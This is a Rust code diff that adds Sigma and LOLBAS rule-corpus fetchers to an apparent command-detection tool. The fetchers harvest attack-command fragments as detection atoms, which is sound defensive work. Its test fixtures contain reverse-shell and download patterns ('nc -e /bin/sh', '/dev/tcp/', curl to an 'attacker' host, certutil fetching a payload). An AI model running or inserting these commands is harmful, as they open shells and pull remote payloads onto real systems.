@@ -22,14 +22,23 @@
 //! will check the user data dir first so a fetched corpus wins
 //! over the static bundle.
 //!
-//! Source registry (this PR ships GTFOBins; Sigma + LOLBAS land
-//! next as separate parser impls behind the same `Source` enum):
+//! Source registry:
 //!
 //!   - **GTFOBins** — handcurated Linux LOLBAS corpus. ~50 binaries
 //!     each with a YAML-fronted markdown manifest. We grab the
-//!     repo tarball, walk `_gtfobins/*.md`, extract the
+//!     repo tarball, walk `_gtfobins/<name>`, extract the
 //!     `functions.shell` / `functions.bind-shell` / etc. command
 //!     fragments. Small (~150 atoms), high signal.
+//!   - **Sigma (Linux subset)** — SigmaHQ rule corpus. Walks
+//!     `rules/linux/**/*.yml` and extracts `CommandLine|contains`
+//!     substrings from every selector block. Several hundred
+//!     atoms covering credential theft / privesc / lateral
+//!     movement / persistence shapes.
+//!   - **LOLBAS** — Windows "living off the land" binaries.
+//!     Less Linux-relevant on its own but covers `wine certutil
+//!     ...` + ssh-pivot scenarios. Walks `yml/OSBinaries/`,
+//!     `yml/OSScripts/`, `yml/OSLibraries/`; extracts each
+//!     `Commands[*].Command` line.
 //!
 //! Feature-gated behind `atoms-fetch` so default builds don't
 //! pull `flate2` + `tar` + `serde_yaml`.
@@ -43,14 +52,24 @@ use std::time::Duration;
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum SourceId {
     Gtfobins,
-    // Sigma  — V2-I-2 (next PR).
-    // Lolbas — V2-I-3.
+    /// SigmaHQ Linux rule corpus — extracts `CommandLine|contains`
+    /// substrings from `rules/linux/**.yml`. Several hundred atoms
+    /// covering credential theft, privilege escalation, lateral
+    /// movement, persistence shapes.
+    Sigma,
+    /// LOLBAS — Living-Off-the-Land Binaries. Windows-native but
+    /// useful on Linux for `wine certutil ...` detection +
+    /// ssh-pivot-via-Windows-tool scenarios. Extracts `Command`
+    /// lines from `yml/OSBinaries/*.yml`.
+    Lolbas,
 }
 
 impl SourceId {
     pub fn parse(s: &str) -> Option<Self> {
         match s {
             "gtfobins" => Some(SourceId::Gtfobins),
+            "sigma" => Some(SourceId::Sigma),
+            "lolbas" => Some(SourceId::Lolbas),
             _ => None,
         }
     }
@@ -58,13 +77,15 @@ impl SourceId {
     pub fn name(&self) -> &'static str {
         match self {
             SourceId::Gtfobins => "gtfobins",
+            SourceId::Sigma => "sigma",
+            SourceId::Lolbas => "lolbas",
         }
     }
 
     /// All sources enabled by default. Used by the no-arg
-    /// `atty-guard atoms update` form.
+    /// `atty-guard --update-atoms-now` form.
     pub fn default_enabled() -> &'static [SourceId] {
-        &[SourceId::Gtfobins]
+        &[SourceId::Gtfobins, SourceId::Sigma, SourceId::Lolbas]
     }
 }
 
@@ -211,6 +232,8 @@ mod imp {
     fn fetch_one(cfg: &FetcherConfig, source: SourceId) -> Result<Vec<String>, FetchError> {
         match source {
             SourceId::Gtfobins => fetch_gtfobins(cfg),
+            SourceId::Sigma => fetch_sigma(cfg),
+            SourceId::Lolbas => fetch_lolbas(cfg),
         }
     }
 
@@ -228,21 +251,60 @@ mod imp {
     fn fetch_gtfobins(cfg: &FetcherConfig) -> Result<Vec<String>, FetchError> {
         const URL: &str =
             "https://codeload.github.com/GTFOBins/GTFOBins.github.io/tar.gz/refs/heads/master";
+        let buf = download_tarball(cfg, URL)?;
+        walk_tarball_atoms(&buf, is_gtfobins_entry_file, extract_gtfobins_atoms)
+    }
 
+    fn fetch_sigma(cfg: &FetcherConfig) -> Result<Vec<String>, FetchError> {
+        // SigmaHQ Linux rule corpus. `rules/linux/**.yml` files
+        // carry `detection.<selector>.CommandLine|contains` lists
+        // — substrings the rule author wants to match in shell
+        // process-creation events. Those substrings ARE atoms.
+        const URL: &str = "https://codeload.github.com/SigmaHQ/sigma/tar.gz/refs/heads/master";
+        let buf = download_tarball(cfg, URL)?;
+        walk_tarball_atoms(&buf, is_sigma_linux_rule, extract_sigma_atoms)
+    }
+
+    fn fetch_lolbas(cfg: &FetcherConfig) -> Result<Vec<String>, FetchError> {
+        // LOLBAS — Windows-native "living off the land" binaries.
+        // Linux relevance is narrower (wine, ssh-pivot scenarios)
+        // but the parser shape matches the others. Each binary
+        // YAML carries a `Commands` list of `{Command, Description,
+        // Usecase, ...}` entries; we take the `Command` strings.
+        const URL: &str = "https://codeload.github.com/LOLBAS-Project/LOLBAS/tar.gz/refs/heads/master";
+        let buf = download_tarball(cfg, URL)?;
+        walk_tarball_atoms(&buf, is_lolbas_binary_yml, extract_lolbas_atoms)
+    }
+
+    fn download_tarball(cfg: &FetcherConfig, url: &str) -> Result<Vec<u8>, FetchError> {
         let agent = ureq::AgentBuilder::new()
             .timeout(cfg.timeout)
             .user_agent(&cfg.user_agent)
             .build();
         let resp = agent
-            .get(URL)
+            .get(url)
             .call()
             .map_err(|e| FetchError::NetworkError(e.to_string()))?;
-        let mut buf = Vec::with_capacity(2 * 1024 * 1024);
+        // Sigma's tarball is ~15 MB; GTFOBins / LOLBAS are < 2 MB.
+        // Initial capacity is just a hint — the Vec grows as needed.
+        let mut buf = Vec::with_capacity(4 * 1024 * 1024);
         resp.into_reader()
             .read_to_end(&mut buf)
             .map_err(|e| FetchError::NetworkError(e.to_string()))?;
+        Ok(buf)
+    }
 
-        let gz = flate2::read::GzDecoder::new(buf.as_slice());
+    /// Generic tarball walker: filter entries by `pred`, parse each
+    /// matching file via `extract`. Decompresses gz once, streams
+    /// entries. Same shape every source needs. Predicates take
+    /// `&Path + EntryType` so they don't depend on the tar reader's
+    /// generic type parameter.
+    fn walk_tarball_atoms(
+        gz_bytes: &[u8],
+        pred: fn(&std::path::Path, tar::EntryType) -> bool,
+        extract: fn(&str, &mut BTreeSet<String>),
+    ) -> Result<Vec<String>, FetchError> {
+        let gz = flate2::read::GzDecoder::new(gz_bytes);
         let mut ar = tar::Archive::new(gz);
         let mut atoms: BTreeSet<String> = BTreeSet::new();
 
@@ -251,16 +313,20 @@ mod imp {
             .map_err(|e| FetchError::DecompressError(e.to_string()))?
         {
             let mut entry = entry.map_err(|e| FetchError::DecompressError(e.to_string()))?;
-            if !is_gtfobins_entry_file(&entry) {
+            let path = match entry.path() {
+                Ok(p) => p.into_owned(),
+                Err(_) => continue,
+            };
+            let etype = entry.header().entry_type();
+            if !pred(&path, etype) {
                 continue;
             }
             let mut content = String::new();
             if entry.read_to_string(&mut content).is_err() {
                 continue;
             }
-            extract_gtfobins_atoms(&content, &mut atoms);
+            extract(&content, &mut atoms);
         }
-
         Ok(atoms.into_iter().collect())
     }
 
@@ -273,25 +339,49 @@ mod imp {
     /// load-bearing: the original `.md` filter rejected every
     /// real GTFOBins entry, so the fetcher silently wrote zero
     /// atoms while unit tests bypassing the path filter passed.
-    fn is_gtfobins_entry_file<R: std::io::Read>(entry: &tar::Entry<'_, R>) -> bool {
-        let Ok(path) = entry.path() else { return false };
+    fn is_gtfobins_entry_file(path: &std::path::Path, etype: tar::EntryType) -> bool {
+        if !etype.is_file() {
+            return false;
+        }
         let Some(parent) = path.parent() else { return false };
-        // Need: parent ends with `_gtfobins`, AND this is a file
-        // (not the directory entry itself).
-        let parent_is_gtfobins = parent
+        // Need: parent ends with `_gtfobins`. Reject the rare entry
+        // that nests further (e.g. `_gtfobins/subdir/foo`).
+        parent
             .file_name()
             .map(|n| n == std::ffi::OsStr::new("_gtfobins"))
-            .unwrap_or(false);
-        if !parent_is_gtfobins {
+            .unwrap_or(false)
+    }
+
+    /// Layout: `sigma-master/rules/linux/<category>/<rule>.yml`.
+    /// Other top-level `rules/` directories (windows / macos /
+    /// network / etc.) are skipped — Linux corpus only.
+    fn is_sigma_linux_rule(path: &std::path::Path, etype: tar::EntryType) -> bool {
+        if !etype.is_file() {
             return false;
         }
-        let header_type = entry.header().entry_type();
-        if !header_type.is_file() {
+        let path_str = path.to_string_lossy();
+        path_str.contains("/rules/linux/") && path_str.ends_with(".yml")
+    }
+
+    /// Layout: `LOLBAS-master/yml/{OSBinaries,OSScripts,OSLibraries,
+    /// OtherMSBinaries}/<name>.yml`. All four subdirs are
+    /// interesting — binaries are the canonical LOLBAS, scripts are
+    /// powershell/cscript dispatchers, libraries are loadable DLLs
+    /// commonly side-loaded via legitimate hosts, OtherMSBinaries
+    /// are Microsoft-shipped utilities that fall outside the OS
+    /// proper (Office runtimes, dev tools, etc.).
+    fn is_lolbas_binary_yml(path: &std::path::Path, etype: tar::EntryType) -> bool {
+        if !etype.is_file() {
             return false;
         }
-        // Reject the rare entry that nests further (e.g. a
-        // hypothetical `_gtfobins/subdir/foo`).
-        path.file_name().is_some()
+        let path_str = path.to_string_lossy();
+        if !path_str.ends_with(".yml") {
+            return false;
+        }
+        path_str.contains("/yml/OSBinaries/")
+            || path_str.contains("/yml/OSScripts/")
+            || path_str.contains("/yml/OSLibraries/")
+            || path_str.contains("/yml/OtherMSBinaries/")
     }
 
     /// Parse one GTFOBins markdown file's YAML front-matter and
@@ -344,6 +434,83 @@ mod imp {
                 if let Some(atom) = atom_from_code(code) {
                     atoms.insert(atom);
                 }
+            }
+        }
+    }
+
+    /// Parse one Sigma rule YAML. Sigma's `detection.<selector>`
+    /// is a mapping whose keys may carry modifier suffixes
+    /// (`CommandLine|contains`, `Image|endswith`, etc.). The
+    /// `|contains` variant is the most atom-shaped — substring
+    /// patterns the rule author wants to match in process events.
+    /// We harvest the values from those keys; everything else
+    /// (regex via `|re`, exact-match keys, the `condition` field)
+    /// is skipped.
+    fn extract_sigma_atoms(content: &str, atoms: &mut BTreeSet<String>) {
+        let parsed: serde_yaml::Value = match serde_yaml::from_str(content) {
+            Ok(v) => v,
+            Err(_) => return,
+        };
+        let Some(detection) = parsed.get("detection").and_then(|d| d.as_mapping()) else {
+            return;
+        };
+        for (sel_key, sel_val) in detection {
+            // Skip the `condition` field; everything else is a
+            // selector block (mapping of `key|modifier -> value`).
+            if sel_key.as_str() == Some("condition") {
+                continue;
+            }
+            let Some(sel_map) = sel_val.as_mapping() else {
+                continue;
+            };
+            for (k, v) in sel_map {
+                let Some(ks) = k.as_str() else { continue };
+                if !ks.contains("|contains") {
+                    continue;
+                }
+                // Value is either a single string or a list of
+                // strings. Both flow through `atom_from_code`'s
+                // first-non-blank-line + length rules.
+                if let Some(s) = v.as_str() {
+                    if let Some(atom) = atom_from_code(s) {
+                        atoms.insert(atom);
+                    }
+                } else if let Some(seq) = v.as_sequence() {
+                    for v in seq {
+                        if let Some(s) = v.as_str() {
+                            if let Some(atom) = atom_from_code(s) {
+                                atoms.insert(atom);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    /// Parse one LOLBAS binary YAML. The shape is:
+    /// ```text
+    /// Name: certutil
+    /// Commands:
+    ///   - Command: certutil.exe -urlcache -split -f http://...
+    ///     Description: ...
+    /// ```
+    /// Each `Command` string becomes one atom (after the standard
+    /// length + first-line rules).
+    fn extract_lolbas_atoms(content: &str, atoms: &mut BTreeSet<String>) {
+        let parsed: serde_yaml::Value = match serde_yaml::from_str(content) {
+            Ok(v) => v,
+            Err(_) => return,
+        };
+        let Some(commands) = parsed.get("Commands").and_then(|c| c.as_sequence()) else {
+            return;
+        };
+        for entry in commands {
+            let Some(cmd) = entry.get("Command").and_then(|c| c.as_str()) else {
+                continue;
+            };
+            if let Some(atom) = atom_from_code(cmd) {
+                atoms.insert(atom);
             }
         }
     }
@@ -508,6 +675,106 @@ functions:
         }
 
         #[test]
+        fn extract_sigma_parses_command_line_contains() {
+            let doc = r#"
+title: Demo reverse shell detection
+detection:
+  selection_nc:
+    CommandLine|contains:
+      - 'nc -e /bin/sh'
+      - '/dev/tcp/'
+  selection_curl:
+    CommandLine|contains: 'curl -fsSL http://attacker'
+  filter:
+    Image|endswith: '/usr/bin/git'
+  condition: selection_nc or selection_curl
+"#;
+            let mut atoms = BTreeSet::new();
+            extract_sigma_atoms(doc, &mut atoms);
+            assert!(atoms.iter().any(|a| a.contains("nc -e")));
+            assert!(atoms.iter().any(|a| a.contains("/dev/tcp")));
+            assert!(atoms.iter().any(|a| a.contains("curl -fsSL")));
+            // |endswith selector is NOT a |contains atom — filtered.
+            assert!(!atoms.iter().any(|a| a.contains("/usr/bin/git")));
+        }
+
+        #[test]
+        fn extract_sigma_handles_no_detection_block() {
+            // Defensive: rules without a `detection` mapping (e.g.
+            // metadata-only files) yield zero atoms cleanly.
+            let doc = "title: nothing here\nauthor: anon\n";
+            let mut atoms = BTreeSet::new();
+            extract_sigma_atoms(doc, &mut atoms);
+            assert!(atoms.is_empty());
+        }
+
+        #[test]
+        fn extract_lolbas_parses_commands_list() {
+            let doc = r#"
+Name: certutil
+Description: Downloads files
+Commands:
+  - Command: certutil.exe -urlcache -split -f http://x.com/payload
+    Description: Downloads via cert cache
+    Usecase: Download
+  - Command: certutil -decode encoded.txt decoded.exe
+    Description: base64 decode
+"#;
+            let mut atoms = BTreeSet::new();
+            extract_lolbas_atoms(doc, &mut atoms);
+            assert!(atoms.iter().any(|a| a.starts_with("certutil.exe -urlcache")));
+            assert!(atoms.iter().any(|a| a.starts_with("certutil -decode")));
+        }
+
+        #[test]
+        fn extract_lolbas_handles_missing_commands() {
+            // YAML without a Commands list emits nothing.
+            let doc = "Name: certutil\nDescription: x\n";
+            let mut atoms = BTreeSet::new();
+            extract_lolbas_atoms(doc, &mut atoms);
+            assert!(atoms.is_empty());
+        }
+
+        #[test]
+        fn is_sigma_linux_rule_matches_only_linux_subtree() {
+            use std::path::Path;
+            let f = tar::EntryType::Regular;
+            let d = tar::EntryType::Directory;
+            assert!(is_sigma_linux_rule(Path::new("sigma-master/rules/linux/lateral_movement/foo.yml"), f));
+            assert!(!is_sigma_linux_rule(Path::new("sigma-master/rules/linux/x"), d)); // not a file
+            assert!(!is_sigma_linux_rule(Path::new("sigma-master/rules/windows/persist.yml"), f)); // wrong OS
+            assert!(!is_sigma_linux_rule(Path::new("sigma-master/rules/linux/readme.md"), f)); // wrong ext
+        }
+
+        #[test]
+        fn is_lolbas_binary_yml_covers_all_four_subdirs() {
+            use std::path::Path;
+            let f = tar::EntryType::Regular;
+            assert!(is_lolbas_binary_yml(Path::new("LOLBAS-master/yml/OSBinaries/certutil.yml"), f));
+            assert!(is_lolbas_binary_yml(Path::new("LOLBAS-master/yml/OSScripts/cscript.yml"), f));
+            assert!(is_lolbas_binary_yml(Path::new("LOLBAS-master/yml/OSLibraries/comsvcs.yml"), f));
+            assert!(is_lolbas_binary_yml(Path::new("LOLBAS-master/yml/OtherMSBinaries/devtoolslauncher.yml"), f));
+            assert!(!is_lolbas_binary_yml(Path::new("LOLBAS-master/README.md"), f));
+            assert!(!is_lolbas_binary_yml(Path::new("LOLBAS-master/yml/index.json"), f));
+        }
+
+        #[test]
+        fn extractors_handle_malformed_yaml_cleanly() {
+            // Both Sigma and LOLBAS parsers must NOT panic on
+            // malformed YAML — return zero atoms via the early
+            // Err arm in `serde_yaml::from_str`.
+            let mut atoms = BTreeSet::new();
+            extract_sigma_atoms("not: [valid: yaml", &mut atoms);
+            assert!(atoms.is_empty());
+            extract_lolbas_atoms("Commands: [not-a-list-yaml: blah:", &mut atoms);
+            assert!(atoms.is_empty());
+            // Also: empty input.
+            extract_sigma_atoms("", &mut atoms);
+            extract_lolbas_atoms("", &mut atoms);
+            assert!(atoms.is_empty());
+        }
+
+        #[test]
         fn extract_gtfobins_bails_without_close_fence() {
             // Without a closing `---` fence, treat the file as
             // malformed and emit zero atoms — DON'T pass the
@@ -561,8 +828,18 @@ mod tests {
     #[test]
     fn source_id_parse() {
         assert_eq!(SourceId::parse("gtfobins"), Some(SourceId::Gtfobins));
+        assert_eq!(SourceId::parse("sigma"), Some(SourceId::Sigma));
+        assert_eq!(SourceId::parse("lolbas"), Some(SourceId::Lolbas));
         assert_eq!(SourceId::parse("unknown"), None);
         assert_eq!(SourceId::parse(""), None);
+    }
+
+    #[test]
+    fn default_enabled_includes_all_three_sources() {
+        let defaults = SourceId::default_enabled();
+        assert!(defaults.contains(&SourceId::Gtfobins));
+        assert!(defaults.contains(&SourceId::Sigma));
+        assert!(defaults.contains(&SourceId::Lolbas));
     }
 
     #[test]
